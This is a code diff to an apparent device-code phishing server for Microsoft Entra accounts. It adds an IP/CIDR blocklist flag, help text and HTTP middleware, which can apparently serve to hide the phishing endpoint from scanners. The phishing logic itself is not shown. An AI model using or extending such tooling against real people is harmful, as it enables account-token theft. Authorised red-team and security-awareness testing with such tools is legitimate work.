@@ -12,6 +12,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/denniskniep/DeviceCodePhishing/pkg/blocklist"
 	"github.com/denniskniep/DeviceCodePhishing/pkg/constants"
 	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
 	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
@@ -35,6 +36,7 @@ var (
 	domain          string
 	certFile        string
 	keyFile         string
+	blocklistFile   string
 )
 
 func init() {
@@ -49,6 +51,7 @@ func init() {
 	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain name for automatic HTTPS (uses Let's Encrypt)")
 	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
 	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
+	runCmd.Flags().StringVarP(&blocklistFile, "blocklist", "b", "", "Blocklist file containing IP addresses and CIDR ranges to block")
 }
 
 var runCmd = &cobra.Command{
@@ -147,6 +150,9 @@ Examples:
   # With custom path (URL will be /auth)
   DeviceCodePhishing server --path /auth --client-id azurecli
   
+  # With blocklist
+  DeviceCodePhishing server --blocklist blocklist.txt --client-id office365
+  
   # With automatic HTTPS (Let's Encrypt) - allows domain and all subdomains
   DeviceCodePhishing server --domain example.com --client-id office365
   # This will accept: example.com, login.example.com, api.example.com, etc.
@@ -154,8 +160,19 @@ Examples:
   # With custom SSL certificates
   DeviceCodePhishing server --cert cert.pem --key key.pem --client-id msteams
   
-  # HTTPS on custom port
-  DeviceCodePhishing server --address :8443 --domain example.com
+  # Full example with blocklist
+  DeviceCodePhishing server --blocklist blocklist.txt --domain example.com --cert cert.pem --key key.pem
+
+Blocklist Format:
+  The blocklist file should contain one IP address or CIDR range per line.
+  Empty lines and lines starting with # are ignored.
+  Examples:
+    192.168.1.0/24
+    10.0.0.1
+    172.16.5.0/24
+    # This is a comment
+    8.8.8.8
+    2001:db8::/32
 
 Note: Cannot specify both --client-id and --custom-client-id simultaneously
 Note: When using --domain, the domain must be properly configured to point to this server's IP
@@ -229,6 +246,28 @@ Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if b
 		server := &http.Server{
 			Addr: address,
 		}
+
+		// Initialize blocklist if provided
+		var blocklistMiddleware func(http.Handler) http.Handler
+		if blocklistFile != "" {
+			// Load blocklist
+			bl, err := blocklist.New(blocklistFile)
+			if err != nil {
+				slog.Error("Failed to load blocklist", "file", blocklistFile, "error", err)
+				os.Exit(1)
+			}
+
+			// Create middleware
+			blocklistMiddleware = blocklist.Middleware(bl)
+			slog.Info("Blocklist enabled", "file", blocklistFile)
+		}
+
+		// Wrap the default ServeMux with middleware
+		var handler http.Handler = http.DefaultServeMux
+		if blocklistMiddleware != nil {
+			handler = blocklistMiddleware(http.DefaultServeMux)
+		}
+		server.Handler = handler
 
 		// Validate certificate files if provided
 		useCustomCerts := false
